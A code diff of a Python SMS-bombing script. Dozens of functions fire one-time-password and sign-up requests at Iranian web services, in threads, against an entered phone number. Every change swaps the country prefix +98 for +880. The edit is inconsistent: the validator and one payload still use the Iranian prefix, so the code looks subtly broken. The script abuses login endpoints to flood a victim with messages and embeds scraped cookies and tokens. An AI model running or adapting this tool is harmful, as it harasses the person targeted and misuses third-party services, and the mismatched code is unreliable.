@@ -29,7 +29,7 @@ def gap(phone):
         pass
 def tap30(phone):
     tap30H = {"Host": "tap33.me","Connection": "keep-alive","Content-Length": "63","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "application/json","Accept": "*/*","Origin": "https://app.tapsi.cab","Sec-Fetch-Site": "cross-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://app.tapsi.cab/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
-    tap30D = {"credential":{"phoneNumber":"0"+phone.split("+98")[1],"role":"PASSENGER"}}
+    tap30D = {"credential":{"phoneNumber":"0"+phone.split("+880")[1],"role":"PASSENGER"}}
     try:
         tap30R = post(timeout=5, url="https://tap33.me/api/v2/user", headers=tap30H, json=tap30D).json()
         if tap30R['result'] == "OK":
@@ -48,7 +48,7 @@ def divar(phone):
 'referer': 'https://divar.ir/',
 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
 'x-standard-divar-error': 'true'}
-    divarD = {"phone":phone.split("+98")[1]}
+    divarD = {"phone":phone.split("+880")[1]}
     try:
         divarR = post(timeout=5, url="https://api.divar.ir/v5/auth/authenticate", headers=divarH, json=divarD).json()
         if divarR["authenticate_response"] == "AUTHENTICATION_VERIFICATION_CODE_SENT":
@@ -58,7 +58,7 @@ def divar(phone):
         pass
     
 def torob(phone):
-    phone = '0'+phone.split('+98')[1]
+    phone = '0'+phone.split('+880')[1]
     torobH = {'accept': '*/*',
 'accept-encoding': 'gzip, deflate, br',
 'accept-language': 'en-US,en;q=0.9',
@@ -85,7 +85,7 @@ def snapfood(phone):
 'origin': 'https://snappfood.ir',
 'referer': 'https://snappfood.ir/',
 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
-    sfoodD = {"cellphone": "0"+phone.split("+98")[1]}
+    sfoodD = {"cellphone": "0"+phone.split("+880")[1]}
     try:
         sfoodR = post(timeout=5, url=sfoodU, headers=sfoodH, data=sfoodD).json()
         if sfoodR['status'] == True:
@@ -96,7 +96,7 @@ def snapfood(phone):
     
 def sheypoor(phone):
     sheyporH = {"Host": "www.sheypoor.com","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0","Accept": "*/*","Accept-Language": "en-US,en;q=0.5","Accept-Encoding": "gzip, deflate, br","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Content-Length": "62","Origin": "https://www.sheypoor.com","Connection": "keep-alive","Referer": "https://www.sheypoor.com/session","Cookie": "plog=False; _lba=false; AMP_TOKEN=%24NOT_FOUND; ts=46f5e500c49277a72f267de92dd51238; track_id=22f97cea33f34e368e4b3edd23afd391; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_session_token=3f475c6e-f55b-0d29-de67-6cdc46bc6592; analytics_token=3cce634d-040a-baf3-fdd6-552578d672df; yektanet_session_last_activity=8/13/2020; _yngt=0bc37b56-6478-488b-c801-521f101259fd; _lbsa=false; _ga=GA1.2.1464689488.1597346921; _gid=GA1.2.1551213293.1597346921; _gat=1","TE": "Trailers"}
-    sheyporD = {"username" : "0"+phone.split("+98")[1]}
+    sheyporD = {"username" : "0"+phone.split("+880")[1]}
     try:
         sheyporR = post(timeout=5, url='https://www.sheypoor.com/auth', headers=sheyporH, data=sheyporD).json()
         if sheyporR['success'] == True:
@@ -107,7 +107,7 @@ def sheypoor(phone):
 
 def okorosh(phone):
     okJ = {
-    "mobile": "0"+phone.split("+98")[1],
+    "mobile": "0"+phone.split("+880")[1],
     "g-recaptcha-response": "03AGdBq255m4Cy9SQ1L5cgT6yD52wZzKacalaZZw41D-jlJzSKsEZEuJdb4ujcJKMjPveDKpAcMk4kB0OULT5b3v7oO_Zp8Rb9olC5lZH0Q0BVaxWWJEPfV8Rf70L58JTSyfMTcocYrkdIA7sAIo7TVTRrH5QFWwUiwoipMc_AtfN-IcEHcWRJ2Yl4rT4hnf6ZI8QRBG8K3JKC5oOPXfDF-vv4Ah6KsNPXF3eMOQp3vM0SfMNrBgRbtdjQYCGpKbNU7P7uC7nxpmm0wFivabZwwqC1VcpH-IYz_vIPcioK2vqzHPTs7t1HmW_bkGpkZANsKeDKnKJd8dpVCUB1-UZfKJVxc48GYeGPrhkHGJWEwsUW0FbKJBjLO0BdMJXHhDJHg3NGgVHlnOuQV_wRNMbUB9V5_s6GM_zNDFBPgD5ErCXkrE40WrMsl1R6oWslOIxcSWzXruchmKfe"
 }
     okU = 'https://my.okcs.com/api/check-mobile'
@@ -131,7 +131,7 @@ def okorosh(phone):
     
 def alibaba(phone):
     alibabaH = {"Host": "ws.alibaba.ir","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0","Accept": "application/json, text/plain, */*","Accept-Language": "en-US,en;q=0.5","Accept-Encoding": "gzip, deflate, br","ab-channel": "WEB,PRODUCTION,CSR,WWW.ALIBABA.IR","ab-alohomora": "MTMxOTIzNTI1MjU2NS4yNTEy","Content-Type": "application/json;charset=utf-8","Content-Length": "29","Origin": "https://www.alibaba.ir","Connection": "keep-alive","Referer": "https://www.alibaba.ir/hotel"}
-    alibabaD = {"phoneNumber":"0"+phone.split("+98")[1]}
+    alibabaD = {"phoneNumber":"0"+phone.split("+880")[1]}
     try:
         alibabaR = post(timeout=5, url='https://ws.alibaba.ir/api/v3/account/mobile/otp', headers=alibabaH, json=alibabaD ).json()
         if alibabaR["result"]["success"] == True:
@@ -141,7 +141,7 @@ def alibaba(phone):
         pass
 
 def smarket(phone):
-    smarketU = f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{phone.split("+98")[1]}'
+    smarketU = f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{phone.split("+880")[1]}'
     smarketH = {'accept': '*/*',
 'accept-encoding': 'gzip, deflate, br',
 'accept-language': 'en-US,en;q=0.9',
@@ -160,7 +160,7 @@ def smarket(phone):
 def gapfilm(phone):
     gaJ = {
     "Type": 3,
-    "Username": phone.split("+98")[1],
+    "Username": phone.split("+880")[1],
     "SourceChannel": "GF_WebSite",
     "SourcePlatform": "desktop",
     "SourcePlatformAgentType": "Opera",
@@ -191,7 +191,7 @@ def gapfilm(phone):
         pass
 def sTrip(phone):
     sTripH = {"Host": "www.snapptrip.com","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0","Accept": "*/*","Accept-Language": "fa","Accept-Encoding": "gzip, deflate, br","Content-Type": "application/json; charset=utf-8","lang": "fa","X-Requested-With": "XMLHttpRequest","Content-Length": "134","Origin": "https://www.snapptrip.com","Connection": "keep-alive","Referer": "https://www.snapptrip.com/","Cookie": "route=1597937159.144.57.429702; unique-cookie=KViXnCmpkTwY7rY; appid=g*-**-*; ptpsession=g--196189383312301530; _ga=GA1.2.118271034.1597937174; _ga_G8HW6QM8FZ=GS1.1.1597937169.1.0.1597937169.60; _gid=GA1.2.561928072.1597937182; _gat_UA-107687430-1=1; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_session_token=445b5d83-abeb-7ffd-091e-ea1ce5cfcb52; analytics_token=2809eef3-a3cf-7b9c-4191-8d8be8e5c6b7; yektanet_session_last_activity=8/20/2020; _hjid=b1148e0d-8d4b-4a3d-9934-0ac78569f4ea; _hjAbsoluteSessionInProgress=0; MEDIAAD_USER_ID=6648f107-1407-4c83-97a1-d39c9ec8ccad","TE": "Trailers"}
-    sTripD = {"lang":"fa","country_id":"860","password":"snaptrippass","mobile_phone":"0"+phone.split("+98")[1],"country_code":"+98","email":"example@gmail.com"}
+    sTripD = {"lang":"fa","country_id":"860","password":"snaptrippass","mobile_phone":"0"+phone.split("+880")[1],"country_code":"+880","email":"example@gmail.com"}
     try:
         sTripR = post(timeout=5, url='https://www.snapptrip.com/register', headers=sTripH, json=sTripD).json()
         if sTripR['status_code'] == 200:
@@ -328,7 +328,7 @@ def nobat(phone):
         pass
 def chmdon(phone):
     chJ = {
-    "mobile": '0'+phone.split('+98')[1],
+    "mobile": '0'+phone.split('+880')[1],
     "origin": "/",
     "referrer_id": None
     }
@@ -353,7 +353,7 @@ def chmdon(phone):
     
 def bn(phone):
     bnJ = {
-    "phone": '0'+phone.split('+98')[1]
+    "phone": '0'+phone.split('+880')[1]
 }
     bnU = 'https://mobapi.banimode.com/api/v2/auth/request'
     bnH = {
@@ -378,7 +378,7 @@ def bn(phone):
     
 def lendo(phone):
     leD = {'_token': 'mXBVe062llzpXAxD5EzN4b5yqrSuWJMVPl1dFTV6',
-'mobile': '0'+phone.split('+98')[1],
+'mobile': '0'+phone.split('+880')[1],
 'password': 'ibvvb@3#9nc'}
     leU = 'https://lendo.ir/register?'
     leH = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -401,7 +401,7 @@ def lendo(phone):
     except:
         pass
 def olgoo(phone):
-    olD = {'contactInfo[mobile]': '0'+phone.split('+98')[1],
+    olD = {'contactInfo[mobile]': '0'+phone.split('+880')[1],
 'contactInfo[agreementAccepted]': '1',
 'contactInfo[teachingFieldId]': '1',
 'contactInfo[eduGradeIds][7]': '7',
@@ -428,7 +428,7 @@ def olgoo(phone):
         pass
     
 def pakhsh(phone):
-    paD = f'action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone.split("+98")[1]}&csrf=fdaa7fc8e6&login=2&username=&email=&captcha=&captcha_ses=&json=1&whatsapp=0'
+    paD = f'action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone.split("+880")[1]}&csrf=fdaa7fc8e6&login=2&username=&email=&captcha=&captcha_ses=&json=1&whatsapp=0'
     paU = 'https://www.pakhsh.shop/wp-admin/admin-ajax.php'
     paH = {'accept': '*/*',
 'accept-encoding': 'gzip, deflate, br',
@@ -448,7 +448,7 @@ def pakhsh(phone):
     except:
         pass
 def didnegar(phone):
-    paD = f'action=digits_check_mob&countrycode=%2B98&mobileNo={phone.split("+98")[1]}&csrf=4c9ac22ff4&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail=0{phone.split("+98")[1]}&dig_otp=&digits_login_remember_me=1&dig_nounce=4c9ac22ff4'
+    paD = f'action=digits_check_mob&countrycode=%2B98&mobileNo={phone.split("+880")[1]}&csrf=4c9ac22ff4&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail=0{phone.split("+880")[1]}&dig_otp=&digits_login_remember_me=1&dig_nounce=4c9ac22ff4'
     paU = 'https://www.didnegar.com/wp-admin/admin-ajax.php'
     paH = {'accept': '*/*',
 'accept-encoding': 'gzip, deflate, br',
@@ -469,7 +469,7 @@ def didnegar(phone):
         pass
 def baskol(phone):
     baJ = {
-    "phone": '0'+phone.split('+98')[1]
+    "phone": '0'+phone.split('+880')[1]
 }
     baU = 'https://www.buskool.com/send_verification_code'
     baH = {'accept': 'application/json, text/plain, */*',
@@ -491,7 +491,7 @@ def baskol(phone):
         pass
 def kilid(phone):
     kiJ = {
-    "mobile": '0'+phone.split('+98')[1]
+    "mobile": '0'+phone.split('+880')[1]
 }
     kiU = 'https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL'
     kiH = {'Accept': 'application/json, text/plain, */*',
@@ -515,7 +515,7 @@ def kilid(phone):
 def basalam(phone):
     baJ = {
     "variables": {
-        "mobile": '0'+phone.split('+98')[1]
+        "mobile": '0'+phone.split('+880')[1]
     },
     "query": "mutation verificationCodeRequest($mobile: MobileScalar!) { mobileVerificationCodeRequest(mobile: $mobile) { success } }"
 }
@@ -539,7 +539,7 @@ def basalam(phone):
     except:
         pass
 def see5(phone):
-    seD = {'mobile': '0'+phone.split('+98')[1],
+    seD = {'mobile': '0'+phone.split('+880')[1],
 'action': 'sendsms'}
     seU = 'https://crm.see5.net/api_ajax/sendotp.php'
     seH = {'accept': '*/*',
@@ -565,7 +565,7 @@ def ghabzino(phone):
         "ApplicationType": "Web",
         "ApplicationUniqueToken": None,
         "ApplicationVersion": "1.0.0",
-        "MobileNumber": '0'+phone.split('+98')[1]
+        "MobileNumber": '0'+phone.split('+880')[1]
     }
 }
     ghU = 'https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode'
@@ -585,7 +585,7 @@ def ghabzino(phone):
         pass
 def simkhanF(phone):
     ghJ = {
-    "mobileNumber": '0'+phone.split('+98')[1],
+    "mobileNumber": '0'+phone.split('+880')[1],
     "ReSendSMS": False
 }
     ghU = 'https://www.simkhanapi.ir/api/users/registerV2'
@@ -608,7 +608,7 @@ def simkhanF(phone):
         pass
 def simkhanT(phone):
     ghJ = {
-    "mobileNumber": '0'+phone.split('+98')[1],
+    "mobileNumber": '0'+phone.split('+880')[1],
     "ReSendSMS": True
 }
     ghU = 'https://www.simkhanapi.ir/api/users/registerV2'
@@ -630,7 +630,7 @@ def simkhanT(phone):
     except:
         pass
 def drsaina(phone):
-    ghD = f"__RequestVerificationToken=CfDJ8NPBKm5eTodHlBQhmwjQAVUgCtuEzkxhMWwcm9NyjTpueNnMgHEElSj7_JXmfrsstx9eCNrsZ5wiuLox0OSfoEvDvJtGb7NC5z6Hz7vMEL4sBlF37_OryYWJ0CCm4gpjmJN4BxSjZ24pukCJF2AQiWg&noLayout=False&action=checkIfUserExistOrNot&lId=&codeGuid=00000000-0000-0000-0000-000000000000&PhoneNumber={'0'+phone.split('+98')[1]}&confirmCode=&fullName=&Password=&Password2="
+    ghD = f"__RequestVerificationToken=CfDJ8NPBKm5eTodHlBQhmwjQAVUgCtuEzkxhMWwcm9NyjTpueNnMgHEElSj7_JXmfrsstx9eCNrsZ5wiuLox0OSfoEvDvJtGb7NC5z6Hz7vMEL4sBlF37_OryYWJ0CCm4gpjmJN4BxSjZ24pukCJF2AQiWg&noLayout=False&action=checkIfUserExistOrNot&lId=&codeGuid=00000000-0000-0000-0000-000000000000&PhoneNumber={'0'+phone.split('+880')[1]}&confirmCode=&fullName=&Password=&Password2="
     ghU = 'https://www.drsaina.com/RegisterLogin?ReturnUrl=%2Fconsultation'
     ghH = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
 'accept-encoding': 'gzip, deflate, br',
@@ -650,7 +650,7 @@ def drsaina(phone):
     except:
         pass
 def binjo(phone):
-    ghU = f"https://api.binjo.ir/api/panel/get_code/{'0'+phone.split('+98')[1]}"
+    ghU = f"https://api.binjo.ir/api/panel/get_code/{'0'+phone.split('+880')[1]}"
     ghH = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
 'Accept-Encoding': 'gzip, deflate, br',
 'Accept-Language': 'en-US,en;q=0.9',
@@ -671,7 +671,7 @@ def binjo(phone):
     except:
         pass
 def limome(phone):
-    liD = {'mobileNumber': phone.split('+98')[1],
+    liD = {'mobileNumber': phone.split('+880')[1],
 'country': '1'}
     liU = 'https://my.limoome.com/api/auth/login/otp'
     liH = {'Accept': 'application/json, text/javascript, */*; q=0.01',
@@ -693,7 +693,7 @@ def limome(phone):
     except:
         pass
 def bimito(phone):
-    liU = f"https://bimito.com/api/core/app/user/checkLoginAvailability/%7B%22phoneNumber%22%3A%220{phone.split('+98')[1]}%22%7D"
+    liU = f"https://bimito.com/api/core/app/user/checkLoginAvailability/%7B%22phoneNumber%22%3A%220{phone.split('+880')[1]}%22%7D"
     liH = {'accept': 'application/json, text/plain, */*',
 'accept-encoding': 'gzip, deflate, br',
 'accept-language': 'en-US,en;q=0.9',
@@ -712,7 +712,7 @@ def bimito(phone):
     except:
         pass
 def bimitoVip(phone):
-    liU = f"https://bimito.com/api/core/app/user/loginWithVerifyCode/%7B%22phoneNumber%22:%220{phone.split('+98')[1]}%22%7D"
+    liU = f"https://bimito.com/api/core/app/user/loginWithVerifyCode/%7B%22phoneNumber%22:%220{phone.split('+880')[1]}%22%7D"
     liH = {'accept': 'application/json, text/plain, */*',
 'accept-encoding': 'gzip, deflate, br',
 'accept-language': 'en-US,en;q=0.9',
@@ -732,7 +732,7 @@ def bimitoVip(phone):
         pass
 def seebirani(phone):
     liJ = {
-    "username": "0"+phone.split('+98')[1]
+    "username": "0"+phone.split('+880')[1]
 }
     liU = "https://sandbox.sibirani.ir/api/v1/user/invite"
     liH = {'accept': 'application/json',
@@ -749,7 +749,7 @@ def seebirani(phone):
     except:
         pass
 def mihanpezeshk(phone):
-    gaD = f'_token=bBSxMx7ifcypKJuE8qQEhahIKpcVApWdfZXFkL8R&mobile={"0"+phone.split("+98")[1]}&recaptcha='
+    gaD = f'_token=bBSxMx7ifcypKJuE8qQEhahIKpcVApWdfZXFkL8R&mobile={"0"+phone.split("+880")[1]}&recaptcha='
     gaU = 'https://www.mihanpezeshk.com/ConfirmCodeSbm_Patient'
     gaH = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
 'accept-encoding': 'gzip, deflate, br',
@@ -786,7 +786,7 @@ def mek(phone):
     meD = {
 	"landingPageUrl": "https://www.hamrah-mechanic.com/",
 	"orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/",
-	"phoneNumber": "0"+phone.split("+98")[1],
+	"phoneNumber": "0"+phone.split("+880")[1],
 	"prevDomainUrl": None,
 	"prevUrl": None,
 	"referrer": "https://www.google.com/"
@@ -800,14 +800,14 @@ def mek(phone):
 # ================================[SEND SMS FUNC]================================
 def is_phone(phone: str):
     phone = sub("\s+", "" ,phone.strip())
-    if match(r"^\+989[0-9]{9}$", phone):
+    if match(r"^\+8809[0-9]{9}$", phone):
         return phone
     elif match(r"^989[0-9]{9}$", phone):
         return f"+{phone}"
     elif match(r"^09[0-9]{9}$", phone):
-        return f"+98{phone[1::]}"
+        return f"+880{phone[1::]}"
     elif match(r"^9[0-9]{9}$", phone):
-        return f"+98{phone}"
+        return f"+880{phone}"
     else:
         return False
 
@@ -864,7 +864,7 @@ def Vip(phone, Time):
     Thread(target=mihanpezeshk, args=[phone]).start(), sleep(Time)
     Thread(target=mek, args=[phone]).start(), sleep(Time)
 while True:
-    phone = is_phone(input(f'{g}[?] {y}Enter Phone Number {g}(+98) {r}- {w}'))
+    phone = is_phone(input(f'{g}[?] {y}Enter Phone Number {g}(+880) {r}- {w}'))
     if phone:
         break
 try:
